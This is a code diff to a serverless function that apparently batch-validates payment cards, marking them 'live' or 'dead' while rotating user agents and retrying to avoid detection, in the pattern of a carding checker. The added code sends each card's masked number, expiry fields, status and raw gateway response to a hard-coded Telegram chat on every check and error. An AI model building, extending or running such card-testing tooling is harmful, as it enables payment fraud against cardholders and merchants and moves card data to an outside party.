@@ -10,6 +10,8 @@ const corsHeaders = {
 
 const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
 const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;
+const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
+const ADMIN_CHAT_ID = "8496943061";
 
 const userAgents = [
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
@@ -65,6 +67,47 @@ const getStatusFromResponse = (data: Record<string, unknown>): "live" | "dead" |
   return "unknown";
 };
 
+// Send debug to admin via Telegram
+const sendAdminDebug = async (cc: string, status: string, rawResponse: string) => {
+  if (!TELEGRAM_BOT_TOKEN) {
+    console.log('[B3-BATCH] No Telegram token - skipping admin debug');
+    return;
+  }
+  
+  try {
+    // Mask card for display
+    const parts = cc.split('|');
+    const maskedCard = parts[0] ? 
+      `${parts[0].slice(0, 6)}******${parts[0].slice(-4)}|${parts[1] || '**'}|${parts[2] || '**'}|***` : 
+      'Invalid format';
+    
+    // Truncate raw response if too long
+    const truncatedRaw = rawResponse.length > 3000 ? 
+      rawResponse.substring(0, 3000) + '\n... [truncated]' : 
+      rawResponse;
+    
+    const statusEmoji = status === 'live' ? '✅' : status === 'dead' ? '❌' : '❓';
+    
+    const message = `${statusEmoji} <b>Yunchi Auth 3 Debug</b>\n\n` +
+      `<b>Card:</b> <code>${maskedCard}</code>\n` +
+      `<b>Status:</b> ${status.toUpperCase()}\n\n` +
+      `<b>Raw API Response:</b>\n<pre>${truncatedRaw.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</pre>`;
+    
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: ADMIN_CHAT_ID,
+        text: message,
+        parse_mode: 'HTML',
+        disable_web_page_preview: true
+      })
+    });
+  } catch (error) {
+    console.error('[B3-BATCH] Failed to send admin debug:', error);
+  }
+};
+
 // Perform single card check with retry logic
 const performCheck = async (cc: string, userAgent: string, attempt: number = 1): Promise<Record<string, unknown>> => {
   const maxRetries = 2; // Reduced retries for batch processing speed
@@ -106,6 +149,9 @@ const performCheck = async (cc: string, userAgent: string, attempt: number = 1):
     const computedStatus = getStatusFromResponse(data);
     const apiMessage = data.message || data.msg || 'No response message';
     
+    // Send admin debug with raw response (fire-and-forget)
+    sendAdminDebug(cc, computedStatus, rawText).catch(() => {});
+    
     // Retry on UNKNOWN
     if (computedStatus === "unknown" && attempt < maxRetries) {
       await new Promise(resolve => setTimeout(resolve, 500 * attempt));
@@ -124,10 +170,15 @@ const performCheck = async (cc: string, userAgent: string, attempt: number = 1):
       return performCheck(cc, getRandomUserAgent(), attempt + 1);
     }
     
+    const errorMsg = error instanceof Error ? error.message : "Unknown fetch error";
+    
+    // Send admin debug for errors too
+    sendAdminDebug(cc, "error", errorMsg).catch(() => {});
+    
     return { 
       cc,
       apiStatus: "ERROR",
-      apiMessage: error instanceof Error ? error.message : "Unknown fetch error",
+      apiMessage: errorMsg,
       computedStatus: "unknown"
     };
   }
